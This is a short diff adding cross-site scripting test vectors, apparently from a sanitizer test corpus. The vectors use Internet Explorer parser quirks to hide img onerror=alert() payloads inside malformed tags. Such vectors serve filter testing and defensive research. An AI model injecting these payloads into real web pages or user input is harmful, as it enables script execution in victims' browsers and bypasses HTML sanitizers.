@@ -1,0 +1,5 @@
+<div id="62"><!-- IE 6-8 -->
+<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
+<!-- IE 6-9 -->
+<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
+<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
